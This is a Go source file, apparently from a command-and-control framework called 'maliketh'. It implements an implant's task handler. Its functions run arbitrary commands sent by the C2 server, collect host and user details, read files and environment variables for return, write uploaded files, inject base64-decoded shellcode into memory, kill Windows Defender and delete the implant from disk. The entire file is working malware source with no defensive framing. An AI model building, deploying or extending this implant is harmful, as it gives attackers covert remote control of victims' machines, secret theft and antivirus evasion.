package implant

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"maliketh/pkg/config"
	"maliketh/pkg/models"
	. "maliketh/pkg/utils"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"

	"maliketh/pkg/shellcode"

	oslib "maliketh/pkg/os"

	"github.com/denisbrodbeck/machineid"
)

func Handle(c2Url string, task models.Task, profile models.MalleableProfile) {
	var output string
	var err error
	switch task.Opcode {
	case models.NOOP:
		return
	case models.OP_CMD:
		output, err = Cmd(task.Args.([]interface{}))
	case models.OP_SELFDESTRUCT:
		output, err = SelfDestruct()
	case models.OP_SYSINFO:
		output, err = Sysinfo()
	case models.OP_SLEEP:
		output, err = Sleep(task.Args.(float64))
	case models.OP_UPDATE_CONFIG:
		output, err = UpdateConfig(task.Args.(map[string]interface{}))
	case models.OP_DOWNLOAD:
		output, err = Download(task.Args.(string))
	case models.OP_UPLOAD:
		output, err = Upload(task.Args.([]string))
	case models.OP_INJECT:
		output, err = Inject(task.Args.([]interface{}))
	case models.OP_CHDIR:
		output, err = Chdir(task.Args.(string))
	case models.OP_PWD:
		output, err = Pwd()
	case models.OP_GETENV:
		output, err = Getenv()
	case models.OP_LS:
		output, err = Ls()
	case models.OP_PS:
		output, err = Ps()
	case models.OP_WHOAMI:
		output, err = Whoami()
	case models.OP_DISABLE_DEFENDER:
		output, err = DisableDefender()
	}

	if err != nil {
		SendTaskResult(task.TaskId, false, err.Error(), c2Url, profile)
	} else {
		SendTaskResult(task.TaskId, true, output, c2Url, profile)
	}
}

// Execute a command on the system and return the output
func Cmd(args []interface{}) (output string, err error) {

	command := args[0].(string)
	args = args[1:]
	str_args := []string{}
	for _, arg := range args {
		str_args = append(str_args, arg.(string))
	}

	// Execute the command
	cmd := exec.Command(command, str_args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}

	// Convert the output to a string
	output = string(out)

	return
}

// Self destruct the implant. This removes the executable from disk and exits with a 0 exit code.
func SelfDestruct() (output string, err error) {

	// Get the path to the executable
	path, err := os.Executable()
	if err != nil {
		return "", err
	}

	// Delete the executable
	err = os.Remove(path)
	if err != nil {
		return "", err
	}

	os.Exit(0)

	// Unreachable, but necessary to compile
	return
}

// Get system information
// Returns a JSON string
func Sysinfo() (output string, err error) {
	results := make(map[string]string)

	// Get compouter name
	hostname, err := os.Hostname()
	if err != nil {
		return "", err
	}
	results["computerName"] = hostname

	// Get username
	username, err := user.Current()
	if err != nil {
		return "", err
	}
	results["userName"] = username.Username

	// Get OS version
	results["osVersion"] = runtime.GOOS

	// Get OS architecture
	results["osPlatform"] = runtime.GOARCH

	// Get number of CPU cores
	results["cpuCores"] = fmt.Sprintf("%d", runtime.NumCPU())

	// Get machine ID
	machineID, err := machineid.ID()
	if err != nil {
		return "", err
	}
	results["machineGuid"] = machineID

	// Get LAN IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "", err
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	results["privateIp"] = localAddr.IP.String()

	// JSON encode the results
	encoded, err := json.Marshal(results)
	if err != nil {
		return "", err
	}

	// Return the results
	return string(encoded), nil
}

// Sleep for a given number of seconds
func Sleep(seconds float64) (output string, err error) {
	time.Sleep(time.Duration(seconds) * time.Second)
	return "", nil
}

// Update the implant configuration
func UpdateConfig(conf map[string]interface{}) (output string, err error) {
	// Parse the config
	config.CurrentProfile.Config.UpdateConfig(conf)
	DebugPrintln(fmt.Sprintf("Updated config: %+v", config.CurrentProfile.Config))
	return "", nil
}

// Download a file from the implant (and upload it to the c2)
func Download(path string) (output string, err error) {
	// Read file
	contents, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}

	return string(contents), nil
}

// Upload a file to the implant (and download it from the c2)
func Upload(args []string) (output string, err error) {
	dest_path, contentsB64 := args[0], args[1]

	// Decode contents
	contents, err := base64.StdEncoding.DecodeString(contentsB64)
	if err != nil {
		return "", err
	}

	// Write file
	err = os.WriteFile(dest_path, contents, 0644)

	return "", err
}

// Inject a shellcode into a process. The args are: ['b64_shellcode', 'pid'].
// Since our injection function injects into the current process, we can just ignore the pid.
func Inject(args []any) (output string, err error) {
	str_args := []string{}
	for _, arg := range args {
		str_args = append(str_args, arg.(string))
	}

	// Decode shellcode
	sc, err := base64.StdEncoding.DecodeString(str_args[0])
	if err != nil {
		return "", err
	}

	return "", shellcode.RunShellcode(sc, false)

}

// Change the current working directory
func Chdir(path string) (output string, err error) {
	err = os.Chdir(path)
	return "", err
}

// Get the current working directory
func Pwd() (output string, err error) {
	path, err := os.Getwd()
	return path, err
}

// Get environment variables
func Getenv() (output string, err error) {
	vars := os.Environ()
	for _, v := range vars {
		output += v + "\n"
	}
	return output, nil
}

// List files in the current working directory
func Ls() (output string, err error) {
	files, err := os.ReadDir(".")
	if err != nil {
		return "", err
	}
	for _, f := range files {
		output += f.Type().String() + "  " + f.Name() + "\n"
	}
	return output, nil
}

// List processes
func Ps() (output string, err error) {
	procs, err := oslib.Processes()
	encoded, err := json.Marshal(procs)
	if err != nil {
		return "", err
	}
	output = string(encoded)
	return output, nil
}

// Get the current user
func Whoami() (output string, err error) {
	username, err := user.Current()
	if err != nil {
		return "", err
	}
	return username.Username, nil
}

// Disable Windows Defender
func DisableDefender() (output string, err error) {
	return "", oslib.PkillAv()
}
